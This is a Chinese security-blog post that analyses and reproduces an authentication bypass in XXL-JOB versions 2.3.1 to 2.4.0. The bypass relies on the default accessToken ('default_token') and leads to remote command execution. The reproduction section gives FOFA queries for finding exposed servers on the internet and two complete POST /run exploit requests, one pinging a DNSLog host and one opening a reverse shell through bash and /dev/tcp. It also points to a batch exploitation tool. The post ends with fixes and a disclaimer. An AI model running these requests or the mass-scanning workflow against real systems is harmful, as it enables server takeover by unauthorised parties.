#  『漏洞复现』XXL-JOB 默认 accessToken 身份绕过 RCE 漏洞分析及复现   
 sec0nd安全   2025-01-24 15:01  
  
**点击蓝字**  
  
  
  
  
  
**关注我们**  
  
  
> 日期：2025 年 1 月 23 日  
> 作者：hdsec  
> 介绍：XXL-JOB 默认 accessToken 身份认证绕过造成 RCE 漏洞。  
  
## 0x00 前言  
  
XXL-JOB  
是一个分布式任务调度平台，常用于定时任务管理和调度。accessToken  
用于身份认证，确保只有合法用户能访问和操作任务。然而，默认配置或实现中的缺陷可能导致认证机制失效。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/4136w7o9Jvc086UGWg2XU5Gu2P6Hd8sZ2iaiakDDufNwYH7CfbdYaicMcWficzB3CHd2qKmdrs45bQ4vBNcRXR879w/640?wx_fmt=jpeg&from=appmsg "")  
## 0x01 漏洞成因  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4136w7o9Jvc086UGWg2XU5Gu2P6Hd8sZgIA3VJicpiaNjSG24RicPc7ErT5wYtQZQq02t79uJxuF0lxCyJBibc6QbA/640?wx_fmt=png&from=appmsg "")  
  
  
默认  
accessToken  
：系统安装后可能使用默认  
accessToken  
，若未及时修改，攻击者可利用默认值绕过认证。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4136w7o9Jvc086UGWg2XU5Gu2P6Hd8sZgIA3VJicpiaNjSG24RicPc7ErT5wYtQZQq02t79uJxuF0lxCyJBibc6QbA/640?wx_fmt=png&from=appmsg "")  
  
  
accessToken  
验证缺失：某些接口或功能可能未正确验证  
accessToken  
，导致攻击者无需有效  
token  
即可访问。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4136w7o9Jvc086UGWg2XU5Gu2P6Hd8sZgIA3VJicpiaNjSG24RicPc7ErT5wYtQZQq02t79uJxuF0lxCyJBibc6QbA/640?wx_fmt=png&from=appmsg "")  
  
  
accessToken  
泄露：  
accessToken  
可能通过日志、错误信息等途径泄露，攻击者可利用其绕过认证。  
## 0x02 影响版本  
  
2.31< XXL-JOB  
 <= 2.4.0  
## 0x03 漏洞分析  
  
简单对该漏洞进行分析一下～  
  
漏洞环境：  
  
https://github.com/xuxueli/xxl-job/releases/tag/2.4.0  
  
下图是在配置文件中的默认值，由于很多人在使用该框架的时候并未修改其默认的值xxl.job.accessToken=default_token  
，攻击者可利用默认值绕过认证，执行任意代码，从而获取服务器权限。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/4136w7o9Jvc086UGWg2XU5Gu2P6Hd8sZMsUqgooSr9XWe0AE6K3Alx67hZsDX4WLwfxQjsV1OBg9bhQ81PXehg/640?wx_fmt=jpeg&from=appmsg "")  
  
get(XxlJobRemotingUtil.XXL_JOB_ACCESS_TOKEN);  
 获取用户输入的XXL_JOB_ACCESS_TOKEN  
值。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/4136w7o9Jvc086UGWg2XU5Gu2P6Hd8sZmJ5CM1NaNYjTmPvRVicES3ichjqk9D3f6LK7cV5587PDPQYzGeQpvDeA/640?wx_fmt=jpeg&from=appmsg "")  
  
判断传入的accessToken  
是不是null  
且不为空，和配置文件中的accessToken  
是否相等，如果不相等，则返回FAIL_CODE  
。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/4136w7o9Jvc086UGWg2XU5Gu2P6Hd8sZO2cpH7uwLFQwLNpfsn5Xpb9AcOFeESiaX6bD2LYKyAoaia4PL41p07uQ/640?wx_fmt=jpeg&from=appmsg "")  
  
找到程序入口。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/4136w7o9Jvc086UGWg2XU5Gu2P6Hd8sZPGjU80z66pfL2UtVjVtuGz5gesf06BFqh36eulrxoU4EO2CmbAV8yQ/640?wx_fmt=jpeg&from=appmsg "")  
```
TriggerParam triggerParam = GsonTool.fromJson(requestData, TriggerParam.class);
return executorBiz.run(triggerParam);
```  
  
将JSON  
格式的字符串requestData  
反序列化为TriggerParam  
对象。  
  
将解析后的任务参数传递给执行器executorBiz  
，调用其run  
方法执行任务。  
跟进TriggerParam  
这个类，确定需要传递的参数。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/4136w7o9Jvc086UGWg2XU5Gu2P6Hd8sZK8w9Wib8yTuUfYykiaF0JhQEOicX4z89CSOWFUJY8GGbJu4rzS5UWF4iaA/640?wx_fmt=jpeg&from=appmsg "")  
  
跟进run  
方法，这段代码是任务调度系统中任务执行的核心逻辑，包括：加载或初始化任务线程和处理器、根据任务类型校验任务处理器、处理任务阻塞策略、注册任务线程、推送任务到队列。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/4136w7o9Jvc086UGWg2XU5Gu2P6Hd8sZGD3w8xlnFzzIdMibllTbqUWRh3VQF6URY7F0moKzYYJtHFFoicAKOCgw/640?wx_fmt=jpeg&from=appmsg "")  
  
继续跟进jobThread  
，如果无超时控制，直接执行任务。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/4136w7o9Jvc086UGWg2XU5Gu2P6Hd8sZsiajiaVmDIIN1IbQwJyT8aV1CJBuBvGqQU8cXEflzgn94DKJHLyaC6Xw/640?wx_fmt=jpeg&from=appmsg "")  
  
跟进execute()  
。  
  
glueType.isScript()  
，检查任务类型是否为脚本类型（如   
GLUE_SHELL  
、  
GLUE_PYTHON   
等）。  
  
String cmd = glueType.getCmd();  
 获取脚本类型对应的执行命令，后续将执行的命令写入脚本文件。  
  
int exitValue = ScriptUtil.execToFile(cmd, scriptFileName, logFileName, scriptParams);  
 调用系统命令执行脚本文件，并将执行日志输出到指定日志文件并执行脚本文件。  
  
当攻击者构造恶意的执行命令，就会导致RCE  
漏洞。详情可见下文漏洞复现。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/4136w7o9Jvc086UGWg2XU5Gu2P6Hd8sZOCuSIicibDnGJZFYsquEetTxhzsmoW1AeALjxgvWrMicViakDajo635xYA/640?wx_fmt=jpeg&from=appmsg "")  
  
## 0x04 漏洞复现  
  
fofa  
语句：  
```
"invalid request, HttpMethod not support" && port="9999"

或者

body="{\"code\":500,\"msg\":\"invalid request, HttpMethod not support.\"}" | fofax -fs 10000 -e>xxl-job.txt
```  
  
在抓取的请求头加上XXL-JOB-ACCESS-TOKEN: default_token  
。  
  
利用下面的请求POC  
可以进行DNSLog  
探测。  
```
POST /run HTTP/1.1
Host: x.x.x.x:9999
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
XXL-JOB-ACCESS-TOKEN: default_token
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Content-Length: 378

{
  "jobId": 1,
  "executorHandler": "demoJobHandler",
  "executorParams": "demoJobHandler",
  "executorBlockStrategy": "COVER_EARLY",
  "executorTimeout": 0,
  "logId": 1,
  "logDateTime": 1586629003729,
  "glueType": "GLUE_SHELL",
  "glueSource": "ping x.ceye.io",      
  "glueUpdatetime": 1586699003758,
  "broadcastIndex": 0,
  "broadcastTotal": 0
}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/4136w7o9Jvc086UGWg2XU5Gu2P6Hd8sZmqsMMReFhxibIaySOibDWCQ9lbY4JYLpt2sGwtzacwcrtmeydflpZgkA/640?wx_fmt=jpeg&from=appmsg "")  
  
还可以利用 bash -i >& /dev/tcp/监听IP/监听端口 0>&1  
 进行反弹shell  
等操作。  
```
POST /run HTTP/1.1
Host: x.x.x.x:9999
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
XXL-JOB-ACCESS-TOKEN: default_token
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Content-Length: 365

{
  "jobId": 1,
  "executorHandler": "demoJobHandler",
  "executorParams": "demoJobHandler",
  "executorBlockStrategy": "COVER_EARLY",
  "executorTimeout": 0,
  "logId": 1,
  "logDateTime": 1586629003729,
  "glueType": "GLUE_SHELL",
  "glueSource": "bash -i >& /dev/tcp/监听IP/监听端口 0>&1",      "glueUpdatetime": 1586699003758,
  "broadcastIndex": 0,
  "broadcastTotal": 0
}

```  
  
## 0x05 批量漏洞挖掘  
  
使用fofaEX  
等工具进行批量搜集，再使用如下工具进行批量漏洞验证：  
```
https://github.com/charonlight/xxl-jobExploitGUI
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/4136w7o9Jvc086UGWg2XU5Gu2P6Hd8sZPkXnicWZPrxicONEbp5uVyVTRwjtRB8XDibgcbr1vMTL7cCH1DIqBWJ4Q/640?wx_fmt=jpeg&from=appmsg "")  
  
## 0x06 修复建议  
  
**1**  
  
**修改默认 accessToken**  
  
  
安装后立即修改默认  
accessToken  
，确保其复杂性。  
  
**2**  
  
**加强 accessToken 验证**  
  
  
确保所有接口和功能都严格验证  
accessToken  
。  
  
**3**  
  
**防止 accessToken 泄露**  
  
  
避免在日志或错误信息中记录  
accessToken  
，并定期更换。  
  
4  
  
**更新版本**  
  
  
及时更新  
XXL-JOB  
，修复已知漏洞。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4136w7o9Jvc086UGWg2XU5Gu2P6Hd8sZMGuTSAFotcN6IjkN5lyZ890qavVbsOopezRicbe8Rsf0vE2xV3LiclfQ/640?wx_fmt=png&from=appmsg "")  
  
**免责声明：本文仅供安全研究与讨论之用，严禁用于非法用途，违者后果自负。**  
  
  
点此亲启  
  
**ABOUT US**  
  
  
  
**宸极实验室**  
隶属山东九州信泰信息科技股份有限公司，致力于网络安全对抗技术研究，是山东省发改委认定的“网络安全对抗关键技术山东省工程研究中心”。团队成员专注于 Web 安全、移动安全、红蓝对抗等领域，善于利用黑客视角发现和解决网络安全问题。  
  
团队自成立以来，圆满完成了多次国家级、省部级重要网络安全保障和攻防演习活动，并积极参加各类网络安全竞赛，屡获殊荣。  
  
对信息安全感兴趣的小伙伴欢迎加入宸极实验室，关注公众号，回复『招聘』，获取联系方式。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/YCOL3hU8ffUqCzyREqVSq3AFOuib0FwZVRlWXWOXsYozHV0XiaYJVGoTian40eVZcGbhUIs9Vltp8YCicncMWEVm9XUSIP0Bj3cA/640?wx_fmt=svg "")  
  
  
